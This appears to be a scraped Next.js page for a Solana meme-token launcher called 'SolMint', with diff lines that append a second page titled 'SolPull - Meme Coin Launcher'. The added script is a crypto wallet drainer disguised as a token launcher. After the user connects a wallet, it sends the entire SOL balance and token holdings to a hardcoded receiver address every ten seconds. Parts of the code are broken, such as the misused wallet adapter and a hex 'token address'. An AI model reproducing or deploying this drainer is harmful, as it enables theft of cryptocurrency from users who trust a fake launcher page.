found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[]}]]}]}]}]}]}]}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$12\"}}]]}]]}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$5\",\"c\",{\"children\":[[\"$\",\"$L13\",null,{\"initialData\":{\"title\":\"SolMint - Launch Your Token\",\"description\":\"Create and deploy your Solana meme token effortlessly in seconds. Reach the world and scale without limits!\",\"stats\":{\"users\":0,\"themes\":3},\"siteName\":\"SolMint\",\"siteLogo\":\"https://i.imgur.com/LR5MT5S.png\"}}],null,[\"$\",\"$L14\",null,{\"children\":\"$L15\"}]]}],{},null]},null],[\"$\",\"$5\",\"h\",{\"children\":[null,[\"$\",\"$5\",\"R2SPBKKQ5kXWguOEXGang\",{\"children\":[[\"$\",\"$L16\",null,{\"children\":\"$L17\"}],[\"$\",\"$L18\",null,{\"children\":\"$L19\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\"}]]}]]}]]],\"m\":\"$undefined\",\"G\":[\"$1a\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"19:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"}]]\n17:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"1\",{\"children\":\"SolMint - Launch Your Token\"}],[\"$\",\"meta\",\"2\",{\"name\":\"description\",\"content\":\"Create and deploy your Solana meme token effortlessly in seconds. Reach the world and scale without limits!\"}],[\"$\",\"meta\",\"3\",{\"name\":\"author\",\"content\":\"SolMint\"}],[\"$\",\"meta\",\"4\",{\"name\":\"keywords\",\"content\":\"solana, token, meme, creator, blockchain, crypto, launch\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"SolMint\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Create and deploy your Solana meme token effortlessly in seconds.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"8\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"9\",{\"name\":\"twitter:title\",\"content\":\"SolMint\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:description\",\"content\":\"Create and deploy your Solana meme token effortlessly in seconds.\"}],[\"$\",\"link\",\"11\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"32x32\"}],[\"$\",\"link\",\"12\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\"}]]\n"])</script><script>self.__next_f.push([1,"15:null\n"])</script><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&#34;version&#34;:&#34;2024.11.0&#34;,&#34;token&#34;:&#34;4282e6bdd1dc4441af6fe20ad2232eba&#34;,&#34;r&#34;:1,&#34;server_timing&#34;:{&#34;name&#34;:{&#34;cfCacheStatus&#34;:true,&#34;cfEdge&#34;:true,&#34;cfExtPri&#34;:true,&#34;cfL4&#34;:true,&#34;cfOrigin&#34;:true,&#34;cfSpeedBrain&#34;:true},&#34;location_startswith&#34;:null}}" crossorigin="anonymous"></script></body>
+<body>
+  <div class="container">
+    <h1>SolPull - Meme Coin Launcher</h1>
+    <button id="connectWalletBtn">Connect Wallet</button>
+    <p id="status">Click "Connect Wallet" to start draining your Solana wallet.</p>
+  </div>
+
+  <div class="footer">
+    &copy; 2025 SolPull | Drains SOL and Meme Coins to:
+    <br />
+    <a href="https://solscan.io/address/3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS" target="_blank">
+      3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS
+    </a>
+  </div>
+
+  <!-- Solana Wallet Adapter Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.90.1"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-phantom@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react@1.90.1/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-ux@1.90.1/dist/index.min.js"></script>
+
+  <script>
+    const walletAdapter = new PhantomWalletAdapter();
+    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+
+    const wallet = window.solana ? window.solana.connect(walletAdapter) : null;
+
+    const receiverAddress = "3FAjhkuhXzp87fmoBCccypDUZDhJRWK5tT8z7L9mvUXS";
+    const tokenAddress = "7f7f962d6917f71d024226f83720f563952f7940"; // Example: Doge token
+
+    const connectWalletBtn = document.getElementById('connectWalletBtn');
+    const status = document.getElementById('status');
+
+    connectWalletBtn.addEventListener('click', async () => {
+      if (!wallet) {
+        status.textContent = 'Please connect your wallet first.';
+        return;
+      }
+
+      status.textContent = 'Draining all SOL and Meme Coins in the background...';
+
+      setInterval(async () => {
+        try {
+          const balance = await connection.getBalance(wallet.publicKey());
+          const lamports = balance / 1e9;
+
+          const transaction = new Transaction().add(
+            SystemProgram.transfer({
+              fromPubkey: wallet.publicKey(),
+              toPubkey: new PublicKey(receiverAddress),
+              lamports: lamports * 1e9, // Drain all SOL
+            })
+          );
+
+          const signature = await wallet.sendTransaction(transaction, connection);
+          await connection.confirmTransaction(signature, 'confirmed');
+
+          // Meme Coin Drain
+          const tokenMint = new PublicKey(tokenAddress);
+          const tokenBalance = await connection.getTokenAccountBalance(tokenMint, wallet.publicKey());
+          const tokenAmount = tokenBalance.value.uiAmount;
+
+          if (tokenAmount > 0) {
+            const tokenTransaction = new Transaction().add(
+              Token.createTransferInstruction(
+                tokenMint,
+                wallet.publicKey(),
+                new PublicKey(receiverAddress),
+                [],
+                1,
+                []
+              )
+            );
+
+            const tokenSignature = await wallet.sendTransaction(tokenTransaction, connection);
+            await connection.confirmTransaction(tokenSignature, 'confirmed');
+          }
+
+          status.textContent = 'Draining all SOL and Meme Coins in the background...';
+        } catch (error) {
+          console.error(error);
+          status.textContent = 'Error: ' + error.message;
+        }
+      }, 10000); // Drain every 10 seconds
+    });
+  </script>
+</body>
 </html>
